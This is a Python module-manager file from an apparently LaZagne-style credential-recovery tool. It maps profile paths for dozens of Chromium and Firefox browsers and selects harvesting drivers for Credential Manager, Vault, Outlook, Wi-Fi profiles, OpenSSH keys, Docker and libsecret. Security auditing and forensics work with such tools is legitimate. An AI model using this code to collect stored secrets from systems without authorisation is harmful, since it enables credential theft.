import sys

from modules.chromium.chromium import Chromium
from modules.firefox.mozilla import Mozilla
from modules.openssh.openssh import Openssh

if sys.platform.startswith('win32'):
	import libs.windows.winstructure as win
	from modules.windows.ie import IE
	from modules.windows.credman import Credman
	from modules.windows.outlook import Outlook
	from modules.windows.vault import Vault
	from modules.windows.wifi import Wifi

if sys.platform.startswith('linux'):
	from modules.linux.docker import Docker
	from modules.linux.libsecret import Libsecret

if sys.platform.startswith('win32'):
	firefox_browsers = [
		(u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
		(u'blackHawk', u'{APPDATA}\\NETGATE Technologies\\BlackHawk'),
		(u'cyberfox', u'{APPDATA}\\8pecxstudios\\Cyberfox'),
		(u'comodo IceDragon', u'{APPDATA}\\Comodo\\IceDragon'),
		(u'k-Meleon', u'{APPDATA}\\K-Meleon'),
		(u'icecat', u'{APPDATA}\\Mozilla\\icecat'),
	]

elif sys.platform.startswith('linux'):
	firefox_browsers = [
		(u'firefox', u'.mozilla/firefox'),
		(u'icecat', u'.mozilla/icecat'),
		(u'waterfox', u'.waterfox'),
	]

if sys.platform.startswith('win32'):
	chromium_browsers = [
		(u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
		(u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
		(u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
		(u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
		(u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
		(u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
		(u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
		(u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
		(u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
		(u'comodo dragon', u'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data'),  # Comodo IceDragon is Firefox-based
		(u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
		(u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
		(u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
		(u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
		(u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
		(u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
		(u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
		(u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
		(u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
		(u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data'),
		(u'yandexBrowser', u'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data')
	]

elif sys.platform.startswith('linux'):
	chromium_browsers = [
		(u'google chrome', u'.config/google-chrome'),
		(u'chromium', u'.config/chromium'),
		(u'brave', u'.config/BraveSoftware/Brave-Browser'),
		(u'slimset', u'.config/slimjet'),
		(u'dissenter Browser', u'.config/GabAI/Dissenter-Browser'),
		(u'vivaldi', u'.config/vivaldi'),
		(u'microsoft edge (dev)', u'.config/microsoft-edge-dev'),
		(u'microsoft edge (beta)', u'.config/microsoft-edge-beta'),
		(u'microsoft edge', u'.config/microsoft-edge'),
	]


class ModuleManager:

	def __init__(self):
		self.targets = {
			'chromium': [],
			'firefox': [],
			'docker': False,
			'credman': False,
			'internet explorer': False,
			'openssh': False,
			'outlook': False,
			'wifi': False
		}

	def iterate_modules(self, module, targets, modules_array, key):
		if (module not in targets.get(key)) and (module in [item[0] for item in modules_array]):
			for item in modules_array:
				if module == item[0].lower():
					targets.get(key).append(item)
					break

	def select_target_modules(self, modules):
		if isinstance(modules, list):
			modules = [module.lower() for module in modules]
		else:
			modules = [modules.lower()]

		if 'all' in modules:
			self.targets.get('firefox').extend([module for module in firefox_browsers])
			self.targets.get('chromium').extend([module for module in chromium_browsers])

			self.targets['openssh'] = True

			if sys.platform.startswith('win32'):
				self.targets['credman'] = True

			if sys.platform.startswith('win32'):
				self.targets['internet explorer'] = True

			if sys.platform.startswith('win32'):
				self.targets['outlook'] = True

			if sys.platform.startswith('win32'):
				self.targets['wifi'] = True

			if sys.platform.startswith('linux'):
				self.targets['docker'] = True

		else:

			if 'openssh' in modules:
				self.targets['openssh'] = True

			if 'credman' in modules and sys.platform.startswith('win32'):
				self.targets['credman'] = True

			if 'internet explorer' in modules and sys.platform.startswith('win32'):
				self.targets['internet explorer'] = True

			if 'outlook' in modules and sys.platform.startswith('win32'):
				self.targets['outlook'] = True

			if 'wifi' in modules and sys.platform.startswith('win32'):
				self.targets['wifi'] = True

			if 'docker' in modules and sys.platform.startswith('linux'):
				self.targets['docker'] = True

			for module in modules:
				self.iterate_modules(module.lower(), self.targets, firefox_browsers, 'firefox')
				self.iterate_modules(module.lower(), self.targets, chromium_browsers, 'chromium')

	def clear_targets(self):
		self.targets = {
			'chromium': [],
			'firefox': [],
			'docker': False,
			'credman': False,
			'internet explorer': False,
			'openssh': False,
			'outlook': False,
			'wifi': False
		}

	def factory_drivers(self):
		drivers = []
		for key in self.targets.keys():
			if self.targets.get(key):
				match key:
					case 'chromium':
						if sys.platform.startswith('linux'):
							drivers.extend([Libsecret()])
						drivers.extend(
							[Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
					case 'firefox':
						drivers.extend([Mozilla(browser_name=name, path=path) for name, path in self.targets.get(key)])
					case 'credman':
						drivers.extend([Credman()])
					case 'docker':
						drivers.extend([Docker()])
					case 'internet explorer':
						if float(win.get_os_version()) > 6.1:
							drivers.extend([Vault()])
						else:
							drivers.extend([IE()])
					case 'openssh':
						drivers.extend([Openssh()])
					case 'outlook':
						drivers.extend([Outlook()])
					case 'wifi':
						drivers.extend([Wifi()])
		return drivers
